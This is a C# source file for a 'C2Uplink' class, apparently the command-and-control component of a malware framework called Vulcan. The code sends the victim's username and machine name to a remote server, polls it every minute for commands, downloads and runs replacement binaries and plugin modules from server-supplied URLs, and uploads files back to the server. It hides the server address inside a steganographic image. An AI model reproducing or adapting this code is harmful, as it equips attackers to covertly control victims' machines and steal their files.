using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Text;
using System.Net;
using System.Xml;
using System.IO;
using System.Threading;
using System.Security.Principal;
using System.Security.Cryptography;
using Vulcan.Core.Crypto;
using Vulcan.Core.Events;
using Vulcan.Core.PluginFramework;

namespace Vulcan.Core.Uplink
{
    public class C2Uplink : IVulcanUplink
    {
        private const string configImage = "[redacted]";
        private static string Server = "";
        private Thread commandListener;

        static C2Uplink()
        {
            Server = GetPrimaryServer();
        }

        public C2Uplink()
        {
            commandListener = new Thread(pullCommands);
            commandListener.IsBackground = true;
            commandListener.Start();
        }

        public void IdentifySelf()
        {
            using(WebClient client = new WebClient())
            {
                NameValueCollection collection = new NameValueCollection();
                collection["identifier"] = getUniqueIdentifier();
                collection["username"] = Environment.UserName;
                collection["machinename"] = Environment.MachineName;
                client.UploadValues(Server + "/identify.php", collection);
            }
        }

        public bool CheckForUpdate()
        {
            try
            {
                string xml = "";

                using (WebClient client = new WebClient())
                {
                    xml = client.DownloadString(Server + "/current-version.php?id=" + getUniqueIdentifier());
                }

                XmlDocument doc = new XmlDocument();
                doc.LoadXml(xml.TrimStart());

                XmlNodeList nodes = doc.DocumentElement.SelectNodes("/CurrentVersion");

                foreach (XmlNode node in nodes)
                {
                    string hash = node.SelectSingleNode("Hash").InnerText.Trim();

                    if (!compareHashes(".VLCN", hash))
                    {
                        Console.WriteLine("C2Uplink::DownloadUpdate()  Update required");
                        Console.Out.Flush();
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("C2Uplink::CheckForUpdate()  Fail: \n{0}", ex.ToString());
                Console.Out.Flush();
            }

            return false;
        }

        public bool DownloadUpdate()
        {
            try
            {
                string xml = "";

                using (WebClient client = new WebClient())
                {
                    xml = client.DownloadString(Server + "/current-version.php?id=" + getUniqueIdentifier());
                }

                XmlDocument doc = new XmlDocument();
                doc.LoadXml(xml.TrimStart());

                XmlNodeList nodes = doc.DocumentElement.SelectNodes("/CurrentVersion");

                foreach (XmlNode node in nodes)
                {
                    string url = node.SelectSingleNode("Url").InnerText.Trim();

                    File.Delete(".VLCN");

                    using (WebClient client = new WebClient())
                    {
                        client.DownloadFile(url, ".VLCN");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("C2Uplink::DownloadUpdate()  Fail: \n{0}", ex.ToString());
                Console.Out.Flush();
            }
            
            return false;
        }

        public void UpdatePlugins(VulcanPluginManager manager)
        {
            if (!Directory.Exists(".VLCNMOD"))
                FileHelper.CreateDirectory(".VLCNMOD");

            string xml = "";

            using (WebClient client = new WebClient())
            {
                xml = client.DownloadString(Server + "/get-modules.php?id=" + getUniqueIdentifier());
            }

            XmlDocument doc = new XmlDocument();
            doc.LoadXml(xml.TrimStart());

            XmlNodeList nodes = doc.DocumentElement.SelectNodes("/Modules/Module");

        
            foreach (XmlNode node in nodes)
            {
                try
                {
                    if (node.Name == "Module")
                    {
                        string url = node.SelectSingleNode("Url").InnerText.Trim();
                        string fileName = node.SelectSingleNode("Name").InnerText.Trim();
                        string hash = node.SelectSingleNode("Hash").InnerText.Trim();

                        bool enabled = node.SelectSingleNode("Enabled").InnerText.ToString().ToLower() == "true";
                        bool persist = node.SelectSingleNode("Persist").InnerText.ToString().ToLower() == "true";

                        string loc = VulcanConfiguration.Instance.InstallLocation + "\\.VLCNMOD\\" + fileName;


                        Console.WriteLine("Module path '{0}'", loc);

                        if (persist && (!File.Exists(loc) || !compareHashes(loc, hash)))
                        {
                            using (WebClient client = new WebClient())
                            {
                                Console.WriteLine("Download {0} -> {1}", url, loc);
                                if (File.Exists(loc))
                                    File.Delete(loc);
                                client.DownloadFile(url, loc);
                                FileHelper.Touch(loc);
                            }
                            manager.AddPlugin(fileName, new PluginInformation(fileName, loc, hash, enabled, persist));
                        }
                        else if(!persist)
                        {
                            manager.AddPlugin(fileName, new PluginInformation(fileName, url, hash, enabled, persist));
                        }

                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("C2Uplink::UpdatePlugins()  Fail: \n{0}", ex.ToString());
                    Console.Out.Flush();
                }
            }
        }

        public void SendFile(string file)
        {
            using (WebClient client = new WebClient())
            {
                client.UploadFile(Server + "/receive-file.php?id=" + getUniqueIdentifier(), "POST", file);
            }
        }

        public void SendFile(string file, string description)
        {
            try
            {

                using (WebClient client = new WebClient())
                {
                    client.UploadFile(Server + "/receive-file.php?id=" + getUniqueIdentifier() + "&d=" + description, "POST", file);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("C2Uplink::SendFile(\"{0}\", \"{1}\")  Fail: \n{2}", file, description, ex.ToString());
                Console.Out.Flush();
            }
        }

        public void SendMessage(string title, string message)
        {

        }


        private void pullCommands()
        {
            while (true)
            {
                try
                {
                    Thread.Sleep(60000);
                    string xml = "";

                    using (WebClient client = new WebClient())
                    {
                        xml = client.DownloadString(Server + "/pull-command.php?id=" + getUniqueIdentifier());
                    }

                    XmlDocument doc = new XmlDocument();
                    doc.LoadXml(xml.TrimStart());

                    XmlNodeList nodes = doc.DocumentElement.SelectNodes("/Commands/Command");


                    foreach (XmlNode node in nodes)
                    {
                        Console.WriteLine(node.Name);
                        if (node.Name == "Command")
                        {
                            string message = node.SelectSingleNode("Message").InnerText;
                            Console.WriteLine("Dispatch " + message);
                            EventBus.GetEventBus().Dispatch(new EventCommandRecieved(message));
                        }
                    }
                }

                catch (Exception ex)
                {
                    Console.WriteLine("C2Uplink::pullCommands()  Fail: \n{0}", ex.ToString());
                    Console.Out.Flush();
                }
            }
        }

        private bool compareHashes(string file, string hash)
        {
            byte[] fhash = new byte[16];
            byte[] hashBytes;

            for (int i = 0; i < 32; i += 2)
            {
                byte b = byte.Parse(hash.Substring(i, 2), System.Globalization.NumberStyles.HexNumber);
                fhash[i / 2] = b;
            }

            using (FileStream inputFileStream = File.Open(file, FileMode.Open))
            {
                var md5 = MD5.Create();
                hashBytes = md5.ComputeHash(inputFileStream);
            }


            for (int i = 0; i < 16; i++)
            {
                if (fhash[i] != hashBytes[i])
                {
                    return false;
                }
            }
            Console.WriteLine("C2Uplink::compareHashes()  Hash check succeeded for {0}", file);
            return true;
        }

        private string getUniqueIdentifier()
        {
            NTAccount f = new NTAccount(Environment.UserName);
            SecurityIdentifier s = (SecurityIdentifier) f.Translate(typeof(SecurityIdentifier));
            string sidString = s.ToString();
            string idString = String.Format("{0}-{1}-{2}", Environment.UserName,
                Environment.MachineName, sidString);

            byte[] result;

            using (SHA256 shaM = new SHA256Managed())
            {
                result = shaM.ComputeHash(Encoding.ASCII.GetBytes(idString));
            }

            StringBuilder res = new StringBuilder();

            for(int i = 0; i < result.Length; i++)
            {
                res.Append(result[i].ToString("x2"));
            }

            return res.ToString();
        }

        private static string GetPrimaryServer()
        {
            using (WebClient client = new WebClient())
            {
                string image = Path.GetTempPath() + "\\.VLCNCONF.jpg";
                client.DownloadFile(configImage, image);
                StegImage simage = new StegImage(image);
                string url = Encoding.ASCII.GetString(simage.Contents).Trim();
                Console.WriteLine("C2Uplink::GetPrimaryServer()  Config: '{0}'", url);
                return url;
            }
        }
    }
}
